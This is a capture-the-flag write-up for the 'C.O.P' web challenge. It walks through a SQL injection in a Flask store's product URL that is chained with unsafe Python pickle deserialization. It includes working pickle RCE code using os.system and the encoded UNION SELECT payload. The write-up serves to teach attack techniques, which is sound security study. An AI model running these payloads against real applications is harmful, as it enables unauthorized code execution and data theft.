---
description: Easy 🔮 Web
cover: https://i.pinimg.com/564x/1a/9f/6f/1a9f6fd2acfbc69c597cca5e038650b8.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# C.O.P

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

I began exploring the website, which appeared to be a simple online store at first glance. It featured a small collection of items, each accompanied by detailed descriptions and images. Interestingly, the website also had numerous pickle-related images scattered throughout. My curiosity piqued, and I clicked on the first item in the list to see what would happen. As expected, this action led me to a more detailed view of the item, complete with additional information and visuals.

However, what caught my attention was the URL that appeared in the address bar: <mark style="color:red;">**`http://localhost:1337/view/1`**</mark>. The structure of this URL seemed straightforward, but I immediately noticed that it contained a parameter at the end—<mark style="color:red;">**`/1`**</mark>. Intrigued by the potential for exploitation, I decided to test the robustness of the application by tinkering with this parameter.

First, I tried changing the <mark style="color:red;">**`1`**</mark> to a <mark style="color:red;">**`0`**</mark>, curious to see if it would display a different item or an empty page. Instead, the entire application crashed. Encouraged by this unexpected result, I attempted a different number, such as <mark style="color:red;">**`5`**</mark>, only to see the application crash once more. This pattern strongly suggested that the application was not handling input validation properly, potentially exposing it to security vulnerabilities like SQL injection attacks.

The repeated crashes hinted at a deeper flaw in the backend code—a possible lack of error handling when querying the database for item details. The application seemed to expect specific parameters and failed whenever it encountered something outside its predefined range. This was promising; it meant that with a bit more experimentation, I might be able to manipulate the input further to gain unauthorized access to the underlying database.

With this in mind, I set my sights on enumerating the code to uncover what was happening beneath the surface. The goal is to craft a malicious input that could exploit this vulnerability, retrieve sensitive data, or even gain control over the entire application. The thrill of the chase had begun, and with every step, I was getting closer to peeling back the layers of this website's defenses.

## Source code

<figure><img src="../../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

With a first look at the <mark style="color:red;">**`module.py`**</mark> file, I realized that the <mark style="color:red;">**`product_id`**</mark> variable was added to the end of each query string without any protection. This inadvertently created a SQL Injection vulnerability.

I tried inserting some malicious query string like <mark style="color:red;">'</mark> <mark style="color:red;"></mark><mark style="color:red;">**OR id='2**</mark>  and it was executed:

<figure><img src="../../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

We can see the query string we inserted as follows:

```sql
SELECT data FROM products WHERE id='' OR id='2'
```

Another interesting detail about the SQL setup is how it stores data for each item. Instead of saving each piece of data—like name, price, or description—in separate columns, it pickles the entire Python object. This pickled data is then encoded in base64 and stored in a single column, along with an ID and a timestamp.

While this approach is flexible, allowing entire objects to be saved in one column, it also adds complexity and potential security risks. If someone could manipulate or decode this data, it might expose vulnerabilities or lead to unauthorized access.

<figure><img src="../../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

Based on the database code, the application saves each <mark style="color:red;">**`Item`**</mark> object by serializing it, then pickling it, and finally encoding it in base64. This encoded data is stored in the database.

To display the items on the webpage, the application uses the <mark style="color:red;">**`pickle`**</mark> module to deserialize the objects back into their original form. Then, it employs a template engine to iterate through each item and render them on the page. This method, however, can be risky if not handled properly, as deserializing pickled data can lead to security vulnerabilities.

{% hint style="info" %}
In Python, the [<mark style="color:red;">**`pickle`**</mark>](https://docs.python.org/3/library/pickle.html) module lets you serialize and deserialize data. Essentially, this means that you can convert a Python object into a stream of bytes and then reconstruct it (including the object’s internal structure) later in a different process or environment by loading that stream of bytes.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**`@app.template_filter('pickle')`**</mark> is how Flask registers a custom filter named <mark style="color:red;">**`pickle`**</mark> for use in templates. This filter is applied to decode and deserialize data using the <mark style="color:red;">**`pickle`**</mark> and <mark style="color:red;">**`base64`**</mark> modules. The function <mark style="color:red;">**`pickle_loads(s)`**</mark> takes a base64-encoded string <mark style="color:red;">**`s`**</mark>, decodes it back to its original binary format using <mark style="color:red;">**`base64.b64decode(s)`**</mark>, and then deserializes it using <mark style="color:red;">**`pickle.loads()`**</mark> to restore the original Python object.

<figure><img src="../../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

And then look at <mark style="color:red;">**`item.html`**</mark>, it uses a custom filter, <mark style="color:red;">**`| pickle`**</mark>, to deserialize the <mark style="color:red;">**`product`**</mark> object, which is then stored in a variable called <mark style="color:red;">**`item`**</mark>.

Since we have control over the SQL query, we can manipulate it to retrieve a base64-encoded pickled string from the database. The application then takes this string and passes it to the <mark style="color:red;">**`pickle_loads`**</mark> function. This function first decodes the base64 string and then deserializes the pickled data, which is then printed on the web page.

Because the deserialization process is automatic and happens without any checks, it opens up the possibility of injecting malicious data into the database. This data, when deserialized, could lead to serious security issues like remote code execution.

{% hint style="info" %}
#### 1. Serialization

**Serialization** is the process of converting an object in memory into a data format that can be easily stored or transmitted, such as a byte stream. This allows data or objects to be saved to a file, database, or sent over a network.

**Purpose of Serialization:**

* **Object Storage**: Save objects to files or databases for later use.
* **Network Communication**: Send objects between different machines or processes.

#### 2. Deserialization

**Deserialization** is the reverse process of serialization. It converts the serialized byte stream back into the original object. This allows the program to restore the original data from the stored or transmitted format.

**Purpose of Deserialization:**

* **Object Restoration**: To reuse previously stored data.
* **Receiving Data from a Network**: Convert received data from a network into objects for processing.
{% endhint %}

## Exploit

The <mark style="color:red;">**`pickle`**</mark> module **is not secure.** It is possible to construct malicious pickle data that will **execute arbitrary code during unpickling**.

According to this [article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/), we can know the way to exploit this

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('cp flag.txt application/static/.')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

By implementing <mark style="color:red;">**`__reduce__`**</mark> in a class in which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects(e.g. we can abuse this to get our reverse shell code executed).

{% hint style="info" %}
The <mark style="color:red;">**`__reduce__()`**</mark> method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “<mark style="color:red;">**`reduce value`**</mark>”). \[…] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:

* A callable object will be called to create the initial version of the object.
* A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. \[…]
{% endhint %}

Run the exploit:

<figure><img src="../../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Crafting payload:

```
http://94.237.54.160:30975/view/' UNION SELECT '<MALICIOUS>
```

```url
http://94.237.54.160:30975/view/'%20UNION%20SELECT%20'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg== 
```

And the SQL query would be:

```sql
SELECT data FROM products WHERE id='' UNION SELECT '<MALICIOUS>'
```

{% code overflow="wrap" %}
```sql
SELECT data FROM products WHERE id='' UNION SELECT 'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg=='
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Navigate to that endpoint to get the flag:

<figure><img src="../../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

